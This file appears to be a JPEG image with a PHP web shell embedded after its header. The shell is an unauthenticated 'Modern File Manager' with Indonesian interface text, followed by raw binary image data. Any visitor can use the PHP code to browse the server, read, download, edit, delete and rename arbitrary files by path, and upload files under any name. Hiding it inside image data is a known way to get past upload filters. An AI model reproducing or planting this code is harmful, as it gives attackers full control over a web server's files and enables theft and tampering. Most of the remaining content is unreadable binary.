����C�

<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
$realDir = realpath($dir);

if (isset($_POST['rename_old']) && isset($_POST['rename_new'])) {
    $oldPath = $_POST['rename_old'];
    $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . $_POST['rename_new'];
    rename($oldPath, $newPath);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['edit_file']) && isset($_POST['file_content'])) {
    file_put_contents($_POST['edit_file'], $_POST['file_content']);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file)) {
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

if (isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if (is_file($file)) {
        unlink($file);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['new_folder'])) {
    $newFolder = $realDir . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    if (!file_exists($newFolder)) {
        mkdir($newFolder, 0755, true);
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_POST['new_file'])) {
    $newFile = $realDir . DIRECTORY_SEPARATOR . basename($_POST['new_file']);
    if (!file_exists($newFile)) {
        file_put_contents($newFile, '');
    }
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $realDir . DIRECTORY_SEPARATOR . $_FILES['file']['name']);
    header('Location: ' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir));
    exit;
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (is_file($file)) {
        $content = htmlspecialchars(file_get_contents($file));
        echo "<h2>Edit File - " . basename($file) . "</h2>";
        echo '<form method="POST" style="padding:20px">
                <input type="hidden" name="edit_file" value="' . htmlspecialchars($file) . '">
                <textarea name="file_content" style="width:100%; height:400px; font-family:monospace;">' . $content . '</textarea><br><br>
                <button type="submit" class="btn">Save</button>
                <a href="' . $_SERVER['PHP_SELF'] . '?dir=' . urlencode($dir) . '" class="btn gray">Kembali</a>
              </form>';
        exit;
    }
}

function listFiles($path) {
    $files = scandir($path);
    $dirs = [];
    $regularFiles = [];

    foreach ($files as $file) {
        if ($file === '.' || $file === '..') continue;
        $fullPath = realpath($path . DIRECTORY_SEPARATOR . $file);
        if (is_dir($fullPath)) {
            $dirs[] = $fullPath;
        } else {
            $regularFiles[] = $fullPath;
        }
    }

    sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
    sort($regularFiles, SORT_NATURAL | SORT_FLAG_CASE);

    foreach (array_merge($dirs, $regularFiles) as $fullPath) {
        $file = basename($fullPath);
        echo '<tr>';
        echo '<td>' . htmlspecialchars($file) . '</td>';
        echo '<td>' . (is_dir($fullPath) ? 'Folder' : 'File') . '</td>';
        echo '<td>' . (is_dir($fullPath) ? '-' : number_format(filesize($fullPath))) . '</td>';
        echo '<td>';
        if (is_dir($fullPath)) {
            echo '<a class="btn small" href="?dir=' . urlencode($fullPath) . '">Open</a>';
        } else {
            echo '<a class="btn small" href="?download=' . urlencode($fullPath) . '">Download</a> ';
            echo '<a class="btn small" href="?edit=' . urlencode($fullPath) . '">Edit</a> ';
            echo '<a class="btn small red" href="?delete=' . urlencode($fullPath) . '" onclick="return confirm(\'Hapus file ini?\')">Delete</a> ';
        }
        echo '<a class="btn small blue" href="#" onclick="showRename(\'' . htmlspecialchars($fullPath) . '\', \'' . htmlspecialchars(basename($fullPath)) . '\')">Rename</a>';
        echo '</td>';
        echo '</tr>';
    }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Modern File Manager</title>
    <style>
        body {
            font-family: "Segoe UI", sans-serif;
            margin: 0;
            padding: 20px;
            background: #eef2f7;
        }
        h2 {
            color: #2c3e50;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            background: #fff;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        th, td {
            padding: 14px;
            border-bottom: 1px solid #e0e0e0;
            text-align: left;
        }
        th {
            background: #f9fafb;
            font-weight: bold;
        }
        .btn {
            background: #3498db;
            color: white;
            padding: 6px 12px;
            text-decoration: none;
            border-radius: 4px;
            display: inline-block;
            margin: 2px 0;
        }
        .btn.gray { background: #95a5a6; }
        .btn.red { background: #e74c3c; }
        .btn.blue { background: #2980b9; }
        .btn.small { font-size: 12px; padding: 4px 8px; }
        .upload-form {
            background: white;
            padding: 20px;
            margin-bottom: 20px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
        }
        #renameBox {
            display:none;
            position:fixed;
            top:30%;
            left:50%;
            transform: translate(-50%, -30%);
            background:white;
            padding:20px;
            box-shadow: 0 0 10px rgba(0,0,0,0.2);
            border-radius: 6px;
            z-index: 9999;
        }
        #renameBox input[type="text"] {
            width: 100%;
            padding: 6px;
            margin: 10px 0;
        }
        .back-link {
            margin-bottom: 10px;
            display: inline-block;
        }
        .form-inline {
            display: inline-block;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <h2>File Manager - <?= htmlspecialchars($realDir) ?></h2>

    <form method="POST" enctype="multipart/form-data" class="upload-form">
        <label>Upload file:</label>
        <input type="file" name="file" required>
        <button type="submit" class="btn">Upload</button>
    </form>

    <form method="POST" class="form-inline">
        <input type="text" name="new_folder" placeholder="Nama folder baru" required>
        <button type="submit" class="btn">Buat Folder</button>
    </form>

    <form method="POST" class="form-inline">
        <input type="text" name="new_file" placeholder="Nama file baru" required>
        <button type="submit" class="btn">Buat File</button>
    </form>

    <table>
        <tr>
            <th>Nama</th><th>Tipe</th><th>Ukuran (byte)</th><th>Aksi</th>
        </tr>
        <tr><td colspan="4"><a class="btn small gray" href="?dir=<?= urlencode(dirname($realDir)) ?>">.. (Up)</a></td></tr>
        <?php listFiles($realDir); ?>
    </table>

    <div id="renameBox">
        <form method="POST">
            <input type="hidden" name="rename_old" id="rename_old">
            <label>Rename to:</label>
            <input type="text" name="rename_new" id="rename_new" required>
            <button type="submit" class="btn">Rename</button>
            <button type="button" class="btn gray" onclick="document.getElementById('renameBox').style.display='none'">Cancel</button>
        </form>
    </div>

    <script>
        function showRename(oldPath, filename) {
            document.getElementById('rename_old').value = oldPath;
            document.getElementById('rename_new').value = filename;
            document.getElementById('renameBox').style.display = 'block';
        }
    </script>
</body>
</html>

	
%# , #&')*)-0-(0%()(���C



(((((((((((((((((((((((((((((((((((((((((((((((((((�������"�����������������������������������������@�@�hC��}!���Ѱ��<"�
9iׂIIIHk�+?�c?��*Y����!�du)b�T�9вU�$8G��I.�澬��D���Sq�
q�}.<��Z�l�V!X�
*x�-�\����t3i�Ũ�sNv71�ƛ\��z|t�L���$�����*f��kʮ��7�H;���~F%�'3�@�H�q�`	9mOL����/x@ @��G<o�)��3��p��XʱK�gg�q�Q��ST���'��
\Yф�k���(		�Ò*�����@g��L�Kv��Յ��^i�u<͎�(%�
O�$0՝-/��H��ӑ�
cM:�Y�%a	���#+}�2'���i����:X��4�ji���V���>d�8F�ه��Ka�Kdr�Fh.�]y4
JЛ�]�K�B�E$��$	$	�PR���΀�G�]���u�i$�$����'��������! "#031�����C/Td=S�Q?���62Ccj{ ����̏d�چ/c�V�`��Wz͈�{Y`�d�h�L
�]OB���l���o���mr���n��s-ڗEZ��N�_�1%b���H�ϣ������V�7):�ӷ)�}�~�(�;�!�b1�5K��[E�vϻ>��q.%�
���O���(�c�#x�$�'+��`٥v��v(�����M�"�v��B��.�a ����T�~�ϕ�hy(6nݱl��1yNɓx�������AR�8�rqv1.cS�+��_�&@��
�u�M�5Ĉ�Xm���eL�X�q��y#�9]�c�}ɄL��d�eJ몓���I1T�d��CaM�$��T�,�X
�bʭ�!�%F5��X1x#���!�q��\��F��2��&Rq���C�ol~�̱�.0ϦL�d�`.������
��m{�Y~k{C��}bv�;U��c<�r��~ɜs�1�j��]W�l��*նCr��Q�N9��-�����d��E؛��nF��eړ�8(q��5UgRȱGTA��*����̆��V�珰����ezN��h�U]�T�FG�^���<��ay�,!���5.�
�u�bΚ�V�J%�m��Dxn'�����6�@BPa�`��Hts�
�ɮ���Ŏ�Zɬ��%B�X��d5Z���hC}�䅸�p+
k=��ʒ(�aՏFG&�%@/�{+�Yu+�ȣGѩ"O%��|vȲxF>�N(��ou�h6	&Y5��8�7�E$-��']n,@TD\��+���Ry��U��U^�Q,f>��1����q��f��U���
���F��ڥ��>I�����fNUw�u��#OMMQ6� N�*��_��	k� ����rS��`���1�:���!�F'<+�
� b?O���2�	�������!Q12A��� "3a������#$���?�,�7�!`yǮ(�1�6w��a����
�F�#��?*"s���v>��Ⱥ����f�v��͑��s����������]Gn�S	���ȥpG
ы�E�g�)Z���x�rY�q�]�@f�_܃�pչEڎّC ����Ŝ*/	�h�O�Sv�و\��5��U��y��|o�Hm2C�S�BW����)��5��{T��W���=o*RA��<���L0g4{��쁢�ep�rw�8��7��U���t<Ԍѻ7�fGf�k}��Ê�㛆Gռz�Q@��{C��'G��8�!�S$�j��x���|���צV<��,���u�k�uu�rM�f�_dϣi ߫�ԟn�!K����mxu�=�槻�'j�X������������%�����������!A "1QR#Br���?�R:��R�n�b[�II?#��6<:�$gN����lGNlrr��dעMMn`ɿy�,�%B�e�W��dVS��r����	%�tT��(�ɷ��S�]�O]#�_LEMHN�M���kv��~X��O6�׿U�V_�����b��J�t�774����D�����!1AQa"2q�#3BRb����0���� 4CSr����cst������?��^q���7�dG�U��"p��moz��'��n_x���唹e����<6���O�t���R>k��s=�Cr���e�?�i��� ���/��ں$be���o`ޮ�GHy�;�fNAl�8��.�\�S������"��a�úF�YvNk�-*`v�k�ʈ2f�EE��Wa�,�
�fF^#�;��[9��^~�����Y$:0#W3������Z*���I�Z�ڹ�k�n--9=��G��;7F)m{T�Ɇ��=�����Ȭ5�5�B�aڞ5M����#m�5Ʀ��m�8��+Hh���$�}�:&�e�Q�[;i]С�:�:��o����$<~���5RB�?�s3�5�r��O��ֿ�w�P/��̅���(�Z6�R>)��N��4�!ʊ�wz�-�r�w+�yk���q�1�bKhƸ�4N�Ӑ�X���Q��_��})�+e1�5��n��q?��[�^�9�<�z3Fsi�8�'�)9p)�{��RP�Z+�*��p(aY��V����6l�g�9��;���d�u���Nt@�3�sTwzaŇ�GT�b�H��(#��*zc�������9K�b1�����t����Ê��<G�CZ]�x���#���Nc�h�+���R�G��$]��W3{?\W�7{'��Vi��h�$�*�S���rF��%ê�ׇ5卾��}t�G�[�Oϵm��[�.�9~�^+�=����NC�*G��&,�󭼑�Q��sE��� �ٷ���_�������Onꐁ$g�*+ew�U�g9��U\|�֋��W�W�ix|��1O�J&��vTU�A��*�D�[��f	�-���{��P�!���D�3N�_%�3���xw��~������g�T4��J��X����K9;1ޜ��ѱ�����{\[�:,�.����H��.��d��r���SݣB�:��UsA�VG�������!�w��
bs$��t�'b�H]��2��J7�����my��!����h��OE��P�u���.�Mx��5�m���΃��^
�.�Ӛs�%�t�ܭm�:�����ϔ�w�^O��[~.@�K߾�,E+�?&v);<��������\��V������R������1�v���+n��iT�jh��}mݚ�>
�Z?g�iD���H�R���B���^M����v���O����L�D,'d�q�C�P�����$Δ��U�֟֊=�s��F�$��J�ދZ?�N�������A�N�WP��,��
�¦򙈉�&;�x��dup���i���Ipd��;�ǅ!��ֿѮAb%�u��}j��-p��>I�[�N�bi����G�'�;4w�m]H�]��#LӘNN��R�������s�.]��en��-�8e�Ps����Q��;���ț�E�ݫ���7��g�_L��W��EZ:/��I���a�g�n�ܤ��iٹ���ŷ�T�H~i�a����֎�~KV������
A-2m]�F"�m�9-Zbǰ�״ @����~�4�N�[�Uxč�tl>������u#r�gѐ�3���;M9�<�J�����1�vfL8��׋��1�P�HgP�Xv��������{����O�}�n��KQ؋����7<�l�fey<�}�>�bX���4<`Y7���si��V)�s�:�{�rO�h�z �@4VW�B���&�������ɡob܋�F��4>y�s�fXWS�N�O$�,.u:�ԫ��g�yao4��$h��D#��ٸf^kh�7�#1Z�֥&���*�v-��;bޭ����Q�����h�ow�y]�ه.+��7�M�ⴻ
�JY��g�f�i3q��KC��3�¹�?5�Z.N��^Z
w���KF͂���7��ރ۞��wj��T�J.�q��\Sv1U����R��욽&�N����pЖ`�`у��m`v�n#z��4��>e���V�`'���h�����'��j�AҔ�-�4:H���n]9�h<��n����U�6m��2c�E�1/�Y��%���I��~ʏ��|VBƟ@���;�����%�M9M���}��1�D��d����%g�O���]��у&�r��f�7�uܲ����(�������!1AQaq������0� ����?!��*��@)�Je�G��j��{�['��v+��������)���(�/����д%젍Z��kk�Lu�Rm����j.c���@Z�
V�J��d��j���h6���2AO�� a;oBu���H�=���nK�W8�B�ɰ�u?���бأm,�sr����|����8˨i��qI2tZ�ۄJP��XE��������zޔj~]UMu����zv!����N�&�1�Y��zJ�ՠ��\p��o'ሸ�C؊Y�TD"HM5�Ъ��i߯a���F����A)�����ڮ����z�E���@�hg�֝8�1jk��\�M�3�8ܢ��	�������s�7����N}�ޭ����GN�Bc���L
pk�;�J�δ3�e�iU�gAYW]\�>�GyگQ=��f�KA;T�a`eM+Q ��
�Ln���̌]GM����<Ħ�j���H���N�M�x�}aX{̣S�	��ԅ��n�MA�S�r�(���(�L��zo9���.�;<R��w�u��R�`_�RA�]�-j	�	f[Ԡ�Ɏ�k�P�����K���Q��b�o��h�i&���{�r��ãb��˫ݾ���O^��:%���gW��]DIci�P+^ob���;���b�!�9���R.�>�ӳf������`Ӕ٢3��
�IW��\9~_���saa�\ԊW�ܭX:���ӆ�38�ty*����N�qP����BI�Y��jE��>DP�!�R%-��4��'�皺;��~J�!�7m��X�h�P!曭���$�\�AYj�.lC��4��+�jD�dgC0-*���|��`ZD�+л�C"��)��s��8Kq�pq���Ms��4�	��7\U`�.��[Ey8��AH!/��,���(:M
-�T䓥�~O�4-���Ԓ�n��}HDN7���K���$�_Ԕ䚞`�R�hB�_aX?4V��ŗ�@ه�u�a�;�{PcT+�������7YBo�?��r-ͩ{�ĎA��	����˼n��M286��G���1���V�˜Jв"l��V5���5�C]h��̊�A���%�
�'p���Ԃ���Ր��9=�d�=�e�{�'<3�_
�:^�~��4�(�n�-C�s��5m![�jmIqU�~�Tw8��`���p�H8�u�Д l
m��aP�0�������9y����CM��F1G糞�.�U~�������FC�{��!e(Y�:���P���7~;�L�N^{�1r�\���ԬG(���0d�ÏO�qK�Z�⑼�T�{
2��s��Kd�Տ?mMQ��=���6�7�i�����H+����9��d�=��;�QؤH8n�Lb�D��yS%�(�{b���Cu���p�t#C���$A"�H{���jqᶯ�:�n=E����hH�`�!�m�MA������?�v6���+MԿ⟚qK�i�D�*Q5��CZ���2�|]�:Xd+�t�:o@��M����
:�32��b����[\5=�ֵ7])�|t��Ϻ�����w�B�ń�e���!`�:���I,��9:���j@/a	8����+<�u�(T^ۺ~��2oE�B�%b)��z��ݳځ�)��i�j��&��Fi`qr��w���7�@�P��
�3Z&<�m�S�C����7t�T����ƴ�q~J�e�r6�Z]�rL���ه�E17'�x���+[�ܜTc6�/����W�`�qpMJ���N5^����x�}{l�Fm������1�oZ\�����/d�/6�	�uӸ�0elXuX;M���$M�}mB�������Z%e���3f�js����O�J~2�z�86�*PB��v�Ν��e-��.�/��L�O����������2����9���4}|��T5M���hÐ7�F*��l+y⑏0����:|��=k[�d�;|�ԉe�=w�<��õ�<���'���������!1AQaq����� ������?��5����)�(���+>v����6&{���Ǹ@���M���v��iA 6T'�w��h�s
�E}�x��G&'g��
J~1q�f�f�����&��q˘���-���vYm<v���Pt��D��5"Bv�����z�H�����4�a�bZ��m�a9j�ٹ&�iք��S�E�T�y[�E9"�cKӶ����G�r�0D�8ah\ǯv�M�:��v��SYu�V�3��)[&ȏr޾��%���83�5�"��v״_M�űc�?���%��'+��h�7�TBH��e`0����U]-�XG|�V��5w�rw@�B�l"oheX�H]	�T�y4{v�
O���^TBC��L$��Εbt�\�W�b�<>�/i1
�I��6��u,)��#�,�΁�l}*&`�$�ͬe�%�w3�x�Ѥ�Xc�D�执g�峕�5B/�|$��=���%8 a��2.l�	c�@G��
�\�/x[өq�]�v5?�����N|�!���\��,>��{�"r�/��?���&����������!1QAa�� ��ᑱ����?ĊD�肭��	nv@�yޝ (�����I�����U
- ����b�m�E>,��1v!�d�&�� ���&�檔�5D�&0P��Ԕ�͒@Z��:E"�
Q��`>PH:~�O������P�3W�@hM��k�U��\�O��R�������5ʄ�,��f�|��r���}јxo)�"+h�QK���/���0�`�5�{M~��
����'������!1AQaq���0 �������?�?�k��#^�~�G��#V,������#Z�1'ܤ���������~p�O%O�O�\�q�`�~��}��E�Ű5 �輸�du���x\�$���s[��{T2t`B��gq�4Z]b� 㛪�3,(@���bAp�r)9:@|b�!r�g:N�^�Ʌ���
�x_�\��pm7I��0?>^k�������w����|.K�[sF@�]Gn*L �yO�
le�P�.p��֍�j�S��=�ʨ�ןQF��"��5zŉ���k�*8�u"
���Fg���
�cSy�V������Ƈ��N��ؐ(����48hV�A�ӎ^��^
���jyB� ��p"�����y]�ļlU�(�7�U`3�pCGF'&yg�������o��z����X��ν:�P"@�G@x[��o&MJ�$F.���hi
w;}�/^͇q���n�mN�/�TQ���އ��O1\,}��bQ
#¯^S!)��X���#GPȏ�t��	c^\��'
}iIZ��a�)�����z���4͊�Ξy��48,��f���#�����KP!Jx�|w�ʆ�������������#��Z�������<
�~K��r�p&qH/;�R���沽��+�E�R���~0v���V#ʀ�T��S(-�ڝ��B�y�b�C�D������b������8��~�= �Y�ͧ]��@n�����M�k2�%�;�%,�r6�LR腻?^��;KŇ=��ք
���=`�ɥ��/����z�&�I{���#J�M���C��}�H9^UJ�,P
��pS����G�d69Ϭu���%"��ˢP��K�"k)��=��9� ���㇌,��Oli��Xzh�
" �
����R��^�s����N�k��Q>�63(����
���PQ�Py�����3����$f+W՛=4�ǁ`*��^��Eb�K�t�6��^��!�籷��ȭ��K{/;�L���p�x����;a���Oلz�[�.NP4�]Gc�T�v���~sg'LED��]j��'�G�]�6rY����UPw�*O�İՋi�'8�۴��#g�Xx+=�eU6�R��c�"�u2��~�?n�y�;��u��3�'��6�f����b��߬M�$*��k&?6���*^1n����ێz)<��Gz�	������7����Y�	��ۃ)$A��2�L6�
ե�H�<�r��#ʽ2���O��R���z��A��XW�@���������<�G�
Ϥ�^�˓i�M�W���6
 �0��m){c�;ݧ�>R�a����}1�ٯ%�EY2�Q��Ep���$ 
��E��qS��t#+x� *�h�UI��XM?�'//��a'�G����q@���<��z��؟����cd��z�ˬT_u�Ѯ����&�z�k
��n
]�a%�py»�`Qd�xc������n��	�*��oTd�;'j�<�!j���'�(~�ʹW�M� P�mȘ��@֨V+��R�`�$��`�+@��_[�kG����P���Zh9�R����&5b�v���Z���#p�&�Ա+��8�etZ7G��;��@"�e0���v7����?��z�?_���_�q1�T�"�p�ˎ/U
6׌_�B�>��0(	��}G#������Ȣ�p��	�9��;/&
`�B&$�y��t(�*z�x��Ӕ�����S�?Kȏ3��{p�	b
�	ۍ-�z܈֦��6?<���ǬP�N�G
�更�
�6�/h�����0Z���������i�ua�e�*M'A�
�x��v�q.>�F�
oN{��Q���{gD��L��u��=|���O
xN���d���q�8(��E�Uu��,��O�
t�DJ	����;��G����e���C��VYZ�
���T4{���(�Ӳ'c�t�f��w�c�jr�e޳�m
�#7,�6��B�E4Q�P�.P�(&��^{9H-�m�o
��q�g1���=��>p�)/"p0!4�mS6ú�FN���h��D
�)��XdT
�FؤZ⸚�k���H�c8v�	<���u�P�Հ���:��_�EN��|�ӛ��u?-�/�o�L�hk�ܸ��S�;�Rī�����T"�N����M��px7<� j�$��`�Y)Pjh
5`
K�Q�f�4�C�bX"�D���;HD�Z�9R b�F)�UA����v�#��H�D�!{������>I�
�`�ԁ
i�4�)t*�ç�Le�_���>ru�GEQg��ǔct��ō0��l6v���d��
���GG8���v^�|�#JyZPSO��
Y�CuAߐ�"�x���OfHF@�K�V�!少Eҕ]h�
��[���)��.q����*0I<8��^�6�}p��^tho���i�g�i����DK���p,���2�3�I��5���쓄OY�6s7Qs�Ow^�w�J/�A➰������0������g(Մ��y��Kԇ���QS��?H���w�X�=���ҞX�~���Q=�'���p?7�@g�~�G�}�r��g�T?���


